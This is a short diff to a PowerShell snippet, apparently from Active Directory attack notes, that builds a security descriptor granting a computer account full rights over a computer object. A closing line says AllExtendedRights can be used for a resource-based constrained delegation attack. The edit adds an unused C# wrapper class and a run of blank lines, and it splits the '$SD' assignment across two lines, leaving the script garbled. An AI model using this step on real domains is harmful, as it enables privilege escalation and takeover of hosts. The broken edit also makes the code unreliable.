@@ -1,4 +1,21 @@
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+Add-Type -TypeDefinition @"
+using System;
+using System.Security.AccessControl;
+public class SecurityDescriptorWrapper {
+    public static RawSecurityDescriptor GetDescriptor(string sid) {
+        return new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")");
+    }
+}
+"@
+
+
+
+
+
+
+
+$SD
+= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack.
